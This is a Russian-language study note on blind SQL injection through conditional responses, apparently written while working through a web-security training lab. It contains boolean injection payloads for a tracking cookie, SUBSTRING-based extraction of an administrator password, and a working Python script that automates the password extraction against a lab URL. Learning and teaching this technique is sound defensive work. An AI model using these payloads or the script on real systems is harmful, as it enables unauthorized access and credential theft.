[[0Определение SQL Injection]] - карта раздела

## Оглавление
[[#Определение]]
[[#Детект Blind SQL injection через условные ответы]]
[[#Пример Эксплуатации]]
[[#Пример лабы]]

---
#### Определение

> [!info] Определение понятия Blind SQL injection
> Когда приложение уязвимо для внедрения SQL но его HTTP ответ не содержит результатов соответствующего SQL-запроса или сведений о каких либо ошибках БД


> [!attention] ВАЖНО
> Методы атак через UNION не являются эффективными при уязвимости которая связана со слепым внедрением SQL. Это связано с тем что они полагаются на возможность видеть результат введенного запроса в ответах приложения

---
#### Детект Blind SQL injection через условные ответы

Предположим что у нас есть уязвимое приложение которое использует следующий заголовок `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4` когда приложение обрабатывает запрос то оно создает следующий запрос: 
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
Этот запрос уязвим для внедрения SQL но результат запроса не будет возвращаться пользователю, но приложение будет вести себя по разному в зависимости от того возвращает ли запрос какие то данные. Если вы отправляете распознанный идентификатор отслеживания то запрос вернет данные и в ответе можно получить что то типо `Welcome back` и такого поведения приложения будет достаточно чтобы говорить о Blind SQL injection, дальше остается только смотреть на различные реакции в зависимости от введенного условия. 
Для понимания того как работает Эксплоит, через `TrackingId` попробуем следующие значения
```sql
...XYZ' AND '1'='1
...XYZ' AND '1'='2
```
Первое значение заставит запрос вернуть результат `Welcome back` потому что выражение `1=1` всегда `true` 
Второе значение не вернет никакого результата потому что `1=2` всегда `false` и сообщение `Welcome back` не появится
Это позволяет нам определить ответ на любое введенное условие и извлекать данные по одному фрагменту за раз 

---
#### Пример Эксплуатации


> [!todo] Заметка
> Представлен пример только для понимания общего смысла эксплуатации 

Например предположим что существует таблица `Users` со столбцами `Username` и `Password` а так же пользователь `Administrtator` вы можете определить пароль для этого пользователя, отправив ряд входных данных для проверки пароля по одному символу за раз, для этого используем:
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
здесь мы получим `Welcome Back` если первый символ находится после `m` то есть `SUBSTRING` вернет либо истину либо ложь и таким образом мы сможем подобрать пароль
Следующий шаг
```sql
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
здесь уже вернет false следовательно буква идет перед s
И последняя подстановка 
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
если этот пример возвращает `true` то буква пароля `s`
Продолжаем этот процесс до тех пор пока не получим полный пароль `Administrator`


---
#### Пример лабы:
лабораторная работа содержит уязвимость, связанную с внедрением SQL-кода вслепую. Приложение использует отслеживающий файл cookie для аналитики и выполняет SQL-запрос, содержащий значение отправленного файла cookie. Результаты SQL-запроса не возвращаются, и сообщения об ошибках не отображаются. Но если запрос возвращает какие-либо строки, приложение отображает на странице ответное сообщение с приветствием. База данных содержит другую таблицу под названием users со столбцами username и password. Чтобы узнать пароль пользователя с правами администратора, необходимо воспользоваться уязвимостью, связанной со слепой SQL-инъекцией. Чтобы решить лабораторную работу, войдите в систему как пользователь-администратор.
Код решение для лабораторной
```python
import requests
import string

targ_url = "https://0a9f007d04204cec81dd57fb0097002e.web-security-academy.net/"
tracking = "lnkvskAxHmeCXTMh"
session = "ChrnB2YvRHGsJ3Qn5ZXb35PGLLm7rY8s"
possible_chars = string.ascii_letters+string.digits
extracted_password = ""

def check_char(position, char):
    payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}'--"
    injected_cookie = tracking + payload
    cookies = {
        "TrackingId": injected_cookie,
        "session": session
    }

    response = requests.get(targ_url, cookies=cookies)
    return "Welcome back" in response.text

def exploit():
    global extracted_password
    print("[*] Starting blind SQL injection...")

    for i in range(1, 100): 
        for char in possible_chars:
            if check_char(i, char):
                extracted_password += char
                print(f"[+] Found character {i}: {char} -> {extracted_password}")
                break
        else:
            print(f"[-] No match found at position {i}. Ending.")
            break

    print(f"[*] Extraction complete. Password: {extracted_password}")

if __name__ == "__main__":
    exploit()
```